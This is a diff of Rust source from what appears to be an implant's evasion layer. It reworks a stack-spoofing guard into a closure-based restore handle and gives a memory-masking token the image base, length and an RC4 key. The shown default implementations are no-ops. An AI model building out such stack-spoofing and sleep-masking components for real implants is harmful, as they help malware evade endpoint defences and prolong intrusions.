@@ -190,19 +190,36 @@ pub trait StackSpoofKit {
     /// guard restores the true stack on `Drop`, so callers write:
     /// `let _g = stack.stack_spoof.enter(&gaps)?; do_sensitive_syscall();`
     /// Object-safe (no generic method) so it can live in `Box<dyn StackSpoofKit>`.
-    fn enter(&self, gaps: &GapPool) -> Result<SpoofGuard<'_>, EvasionError>;
+    fn enter(&self, gaps: &GapPool) -> Result<SpoofGuard, EvasionError>;
 }
 
 /// RAII scope guard: the spoofed stack is live while this owns it; `Drop`
 /// restores the true frame chain. Leaking it leaves the stack spoofed.
+///
+/// Contains an optional restore closure captured at `enter()` time. When the
+/// guard drops, the closure runs — restoring the original RSP / frame chain.
 #[must_use = "a dropped SpoofGuard restores the stack; leaking it leaves the spoof in place"]
-pub struct SpoofGuard<'a> {
-    _kit: &'a dyn StackSpoofKit,
+pub struct SpoofGuard {
+    restore: Option<alloc::boxed::Box<dyn FnOnce()>>,
 }
-impl<'a> Drop for SpoofGuard<'a> {
+
+impl Drop for SpoofGuard {
     fn drop(&mut self) {
-        // Impl-specific restore hook. Default no-op so `Floors` compiles; real
-        // impls store a restore fn and invoke it here.
+        if let Some(f) = self.restore.take() {
+            f();
+        }
+    }
+}
+
+impl SpoofGuard {
+    /// Create a guard that runs `restore_fn` on drop.
+    pub fn new(restore_fn: impl FnOnce() + 'static) -> Self {
+        Self { restore: Some(alloc::boxed::Box::new(restore_fn)) }
+    }
+
+    /// No-op guard (floor default — no restore action needed).
+    pub fn noop() -> Self {
+        Self { restore: None }
     }
 }
 
@@ -232,8 +249,22 @@ pub trait MemoryMaskKit {
     fn unmask(&self, token: MaskToken) -> Result<(), EvasionError>;
 }
 /// Opaque restore handle. `Drop` MUST repair if leaked un-unmasked.
+/// Carries the mask parameters (base, len, key) so `unmask` can restore.
 #[must_use = "an un-unmasked MaskToken leaves the image encrypted → crash"]
-pub struct MaskToken(pub(crate) ());
+pub struct MaskToken {
+    /// Image base address (VA) that was masked.
+    pub base: usize,
+    /// Length of the masked region in bytes.
+    pub len: usize,
+    /// RC4 key used for masking (32 bytes).
+    pub key: [u8; 32],
+}
+impl MaskToken {
+    /// Construct a token. Only real `MemoryMaskKit` impls call this.
+    pub fn new(base: usize, len: usize, key: [u8; 32]) -> Self {
+        Self { base, len, key }
+    }
+}
 
 // ---- Injection (postex) ---------------------------------------------------
 
@@ -325,8 +356,8 @@ impl PdataGapScanner for Floors {
     }
 }
 impl StackSpoofKit for Floors {
-    fn enter(&self, _gaps: &GapPool) -> Result<SpoofGuard<'_>, EvasionError> {
-        Ok(SpoofGuard { _kit: self })
+    fn enter(&self, _gaps: &GapPool) -> Result<SpoofGuard, EvasionError> {
+        Ok(SpoofGuard::noop())
     }
 }
 impl SleepmaskKit for Floors {
